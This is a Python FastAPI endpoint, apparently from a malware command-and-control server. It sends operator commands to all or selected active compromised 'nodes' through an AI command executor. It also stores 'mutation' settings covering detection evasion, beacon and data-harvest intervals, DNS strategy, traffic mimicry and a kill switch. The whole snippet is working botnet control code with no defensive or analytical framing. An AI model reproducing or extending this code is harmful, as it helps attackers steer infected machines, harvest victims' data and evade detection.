@app.post("/api/command")
async def execute_command(data: dict = Body(...)):
    """Execute a direct command on specific nodes or all nodes."""
    action = data.get("action", "")
    params = data.get("params", {})
    target_nodes = data.get("nodes", [])

    if not action:
        return {"status": "error", "message": "Missing 'action'"}

    # If no specific nodes, target all active nodes
    if not target_nodes:
        all_nodes = await c2_server.get_all_nodes()
        target_nodes = [n.get("node_id") for n in all_nodes if n.get("status") in ("active", "online")]

    if not target_nodes:
        return {"status": "error", "message": "No active nodes found"}

    actions = [{"type": action, "nodes": target_nodes, "params": params}]
    await _execute_ai_commands(actions, target_nodes)

    # Also store as mutation if it's a mutation-type action
    if action in ("activate_evasion", "mutate", "silent_mode", "kill_switch"):
        mutation_config = {
            "mode": params.get("mode", action),
            "beacon_interval": params.get("beacon_interval", 60),
            "harvest_interval": params.get("harvest_interval", 3600),
            "dns_strategy": params.get("dns_strategy", "standard"),
            "traffic_mimicry": params.get("traffic_mimicry", False),
            "reason": f"Direct command: {action}",
        }
        await c2_server.redis.set("c2:mutation:active", json.dumps(mutation_config))

    await c2_server._push_event({
        "timestamp": time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()),
        "type": "command",
        "payload": {
            "action": action,
            "params": params,
            "targets": len(target_nodes),
        },
    })

    # Broadcast updated state
    payload = await build_payload()
    await broadcast(payload)

    return {
        "status": "success",
        "action": action,
        "targets": len(target_nodes),
        "params": params,
    }


